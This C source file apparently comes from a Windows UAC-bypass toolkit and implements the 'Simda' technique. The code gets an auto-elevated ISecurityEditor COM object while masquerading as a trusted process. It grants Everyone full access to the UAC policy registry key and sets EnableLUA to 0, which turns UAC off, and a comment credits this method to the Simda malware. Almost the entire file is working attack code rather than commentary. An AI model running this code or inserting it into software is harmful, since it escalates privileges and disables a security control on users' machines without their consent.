/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015 - 2019
*
*  TITLE:       SIMDA.C
*
*  VERSION:     3.17
*
*  DATE:        18 Mar 2019
*
*  Simda based UAC bypass using ISecurityEditor.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* ucmMasqueradedAlterObjectSecurityCOM
*
* Purpose:
*
* Change object security through ISecurityEditor(SetNamedInfo).
* This function expects that supMasqueradeProcess was called on process initialization.
*
*/
DWORD WINAPI ucmMasqueradedAlterObjectSecurityCOM(
    _In_ LPWSTR lpTargetObject,
    _In_ SECURITY_INFORMATION SecurityInformation,
    _In_ SE_OBJECT_TYPE ObjectType,
    _In_ LPWSTR NewSddl
)
{
    HRESULT          r = E_FAIL, hr_init;
    BOOL             cond = FALSE;
    ISecurityEditor *SecurityEditor = NULL;
#ifdef _DEBUG
    CLSID            xCLSID;
    LPOLESTR         pps;
#endif

    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    do {
#ifdef _DEBUG
        r = CLSIDFromString(
            T_CLSID_ShellSecurityEditor,
            &xCLSID);

        if (r != NOERROR)
            break;

        r = CoCreateInstance(
            &xCLSID,
            NULL,
            CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER,
            &IID_ISecurityEditor,
            &SecurityEditor);

        if (r != S_OK)
            break;

        if (SecurityEditor == NULL) {
            r = E_OUTOFMEMORY;
            break;
        }

        SecurityEditor->lpVtbl->Release(SecurityEditor);
#endif

        r = ucmAllocateElevatedObject(
            T_CLSID_ShellSecurityEditor,
            &IID_ISecurityEditor,
            CLSCTX_LOCAL_SERVER,
            &SecurityEditor);

        if (r != S_OK)
            break;

        if (SecurityEditor == NULL) {
            r = E_OUTOFMEMORY;
            break;
        }

#ifdef _DEBUG
        pps = NULL;
        r = SecurityEditor->lpVtbl->GetSecurity(
            SecurityEditor,
            lpTargetObject,
            ObjectType,
            SecurityInformation,
            &pps
        );

        if ((r == S_OK) && (pps != NULL)) {
            OutputDebugStringW(pps);
        }
#endif

        r = SecurityEditor->lpVtbl->SetSecurity(
            SecurityEditor,
            lpTargetObject,
            ObjectType,
            SecurityInformation,
            NewSddl
        );

#ifdef _DEBUG
        if (r == S_OK) {
            OutputDebugStringW(NewSddl);
        }
#endif

    } while (cond);

    if (SecurityEditor != NULL) {
        SecurityEditor->lpVtbl->Release(SecurityEditor);
    }

    if (hr_init == S_OK)
        CoUninitialize();

    return SUCCEEDED(r);
}

/*
* ucmSimdaTurnOffUac
*
* Purpose:
*
* Disable UAC using AutoElevated undocumented ISecurityEditor interface.
* Used by WinNT/Simda starting from 2010 year.
*
* Fixed in Windows 10 TH1
*
*/
NTSTATUS ucmSimdaTurnOffUac(
    VOID
)
{
    NTSTATUS           MethodResult = STATUS_ACCESS_DENIED;
    HANDLE             hKey = NULL;
    DWORD              dwValue;
    WCHAR              szBuffer[MAX_PATH];
    UNICODE_STRING     ustr;
    OBJECT_ATTRIBUTES  obja;
    UNICODE_STRING     usEnableLua = RTL_CONSTANT_STRING(L"EnableLUA");

    if (ucmMasqueradedAlterObjectSecurityCOM(T_UACKEY,
        DACL_SECURITY_INFORMATION, SE_REGISTRY_KEY, T_SDDL_ALL_FOR_EVERYONE))
    {
        RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
        _strcpy(szBuffer, T_REGISTRY_PREP);
        _strcat(szBuffer, T_UACKEY);
        RtlInitUnicodeString(&ustr, szBuffer);
        InitializeObjectAttributes(&obja, &ustr, OBJ_CASE_INSENSITIVE, NULL, NULL);

        MethodResult = NtOpenKey(&hKey, MAXIMUM_ALLOWED, &obja);
        if (NT_SUCCESS(MethodResult)) {

            dwValue = 0;
            MethodResult = NtSetValueKey(
                hKey,
                &usEnableLua,
                0,
                REG_DWORD,
                (PVOID)&dwValue,
                sizeof(DWORD));

            NtClose(hKey);
        }
    }

    if (NT_SUCCESS(MethodResult)) {
        ucmShowMessage(g_ctx->OutputToDebugger, L"UAC is now disabled.\nYou must reboot your computer for the changes to take effect.");
    }

    return MethodResult;
}
